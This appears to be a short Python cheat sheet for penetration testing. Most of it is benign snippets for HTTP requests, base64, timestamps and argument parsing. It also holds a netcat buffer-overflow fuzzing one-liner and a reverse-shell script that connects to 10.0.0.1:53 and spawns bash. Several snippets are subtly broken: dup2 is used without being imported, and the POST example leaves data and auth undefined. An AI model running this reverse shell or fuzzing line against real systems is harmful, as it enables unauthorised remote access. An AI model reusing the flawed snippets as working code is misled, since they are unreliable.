Start of Python3 Script: `#!/usr/bin/env python3`   

GET Request:   
```
# GET http://localhost?user=admin&password=admin
import requests
url = 'http://localhost'
params = {'user':'admin','password':'admin'}
r = requests.get(url = url, params = params)
print(r.content.decode())
```

Post Request:     
```
import requests
url = 'http://localhost'
headers = {"Content-Type" : "application/json"}
res = requests.request('POST',url,headers=headers,data=data,auth=auth)
print('[+] Headers:\n{}\n\n[+] Response:\n{}'.format(res.headers,res.text))
```

GET/POST Session Request:   
```
import requests
session = requests.session()
headers = {
    'Content-Type' : 'application/json',
}
# GET
url = 'http://localhost'
res1 = (session.get(url)).text
# POST - Maintaining cookies
url = 'http://localhost/login.php'
data = {'user':'admin','password':'admin'}
res2 = (session.post(url,headers=headers,data=data)).json()
```

Base64 encode input:   
```
import base64
input = 'encodedstring'
payload = base64.b64encode(input.encode("utf-8"))
```

Time now in EPOCH:   
```
import datetime
import time
dtime = datetime.datetime.now()
t = int(time.mktime(dtime.timetuple()))
```

Handle Arguments with argparse:   
```
import argparse
parser = argparse.ArgumentParser(description='test')
parser.add_argument("--url")
args = parser.parse_args()
url = args.url
```

Handle Arguments using Sys:   
```
import sys

ip = sys.argv[1]
port = sys.argv[2]
```

Python BO fuzzing on terminal:   
```
python -c 'print "\x41"*600' | nc 192.168.1.2 1234
```

Reverse shell:   
```
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",53))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```


Cheat sheets:   
https://media-exp1.licdn.com/dms/document/C4E1FAQEiLwd0gtU6Og/feedshare-document-pdf-analyzed/0/1649395384023?e=2147483647&v=beta&t=PNX5mNjDqhIMwAvw7D2Y8x-A4_8LkLy7Z9jxnnvMDpo   